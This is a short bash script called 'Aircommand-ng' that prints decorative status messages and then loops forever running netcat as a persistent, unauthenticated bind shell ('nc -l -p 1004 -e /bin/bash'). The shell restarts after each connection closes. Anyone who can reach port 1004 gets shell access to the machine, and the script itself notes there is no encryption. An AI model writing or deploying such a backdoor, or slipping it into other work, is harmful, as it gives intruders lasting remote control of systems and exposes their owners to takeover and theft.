#!/bin/bash
echo -e "\033[1m"[+]"\033[0m" "Aircommand-ng v0.9.1 by elogada (c)2018, all deps not mine"
sleep 3
echo -e "\033[1m"[+]"\033[0m" "Initiating script for the first time..."
echo -e "\033[1m""\033[1m"[+]"\033[0m" "Please wait while script is readied..."
sleep 3
echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Script for ready for init..."
echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Network for init..."
sleep 3
while [ 1=1 ]
do
        echo -e "\033[1m"[+]"\033[0m" "Listener seems closed."
        sleep 1
        echo -e "\033[33m""\033[1m"[!]"\033[0m" "Establishing network connections... Please wait..."
        echo -e "\033[1m"[+]"\033[0m" "Networking stage finished."
        sleep 1
        echo -e "\033[1m"[+]"\033[0m" "Port open stage finished."
        echo -e "\033[1m"[-]"\033[0m" "Encryption is unavailable. Please tread wisely."
        echo -e "\033[32m""\033[1m"[ ok ]"\033[1m" "Connection ready!"
        nc -l -p 1004 -e /bin/bash
        echo -e "\033[31m""\033[1m"[!] "\033[0m""Connection closed!"
        echo -e "\033[1m"[+]"\033[0m""Attempting to restart pseudo-daemon..."
        sleep 3
        echo ""
        echo -e "\033[32m""\033[1m"[ ok ]"\033[0m" "Aircommand-ng ready for rebump!""\033[0m"
done
~                              
